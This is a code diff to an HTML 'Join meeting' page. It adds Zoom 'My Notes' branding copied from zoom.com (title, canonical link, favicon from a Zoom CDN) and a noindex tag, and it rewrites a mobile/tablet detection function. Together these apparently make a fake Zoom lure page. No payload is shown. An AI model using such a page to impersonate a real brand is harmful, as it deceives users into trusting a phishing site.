@@ -1,9 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <meta charset="UTF-8">
-  <title>Join meeting</title>
+<html xmlns:fb="http://ogp.me/ns/fb#" lang="en"><head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# zoomvideocall: http://ogp.me/ns/fb/zoomvideocall#"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Zoom My Notes</title>
+    
+    
+    <meta name="referrer" content="origin-when-cross-origin">
+    <meta name="description" content="Never lose ideas, action items, or momentum again, with My Notes - available for most meeting platforms.">
+    <link rel="canonical" href="https://www.zoom.com/en/lp/my-notes">
+    <meta name="robots" content="noindex, nofollow">
+    <link href="https://www.zoom.com/en/lp/my-notes/" hreflang="x-default" rel="alternate">
+    <link href="https://www.zoom.com/en/lp/my-notes" hreflang="en" rel="alternate">
+    <link rel="icon" href="https://st1.zoom.us/maintenance/12042025-0950/my-notes/favicon.ico">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     :root {
@@ -281,21 +287,28 @@
 
   <script>
     // Function to detect if device is mobile or iPad
-    function isMobileOrTablet() {
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+   function isMobileOrTablet() {
+  const ua = (navigator.userAgent || "").toLowerCase();
 
-      // Check for mobile devices
-      const isMobile = /android|webos|iphone|ipod|blackberry|iemobile|opera mini|windows phone/i.test(userAgent.toLowerCase());
+  if (navigator.userAgentData?.mobile === true) {
+    return true;
+  }
 
-      // Check for iPad (including iPadOS 13+ which masks as Mac)
-      const isiPad = /ipad/i.test(userAgent.toLowerCase()) ||
-        (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  if (
+    /android.*mobile|iphone|ipod|windows phone|iemobile|blackberry|opera mini|webos/.test(ua)
+  ) {
+    return true;
+  }
 
-      // Check screen size
-      const isSmallScreen = window.innerWidth <= 1024;
+  if (
+    /ipad|tablet|playbook|silk|(android(?!.*mobile))/.test(ua) ||
+    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
+  ) {
+    return true;
+  }
 
-      return isMobile || isiPad || isSmallScreen;
-    }
+  return false;
+}
 
     // Handle screen resize to re-check
     function handleResize() {
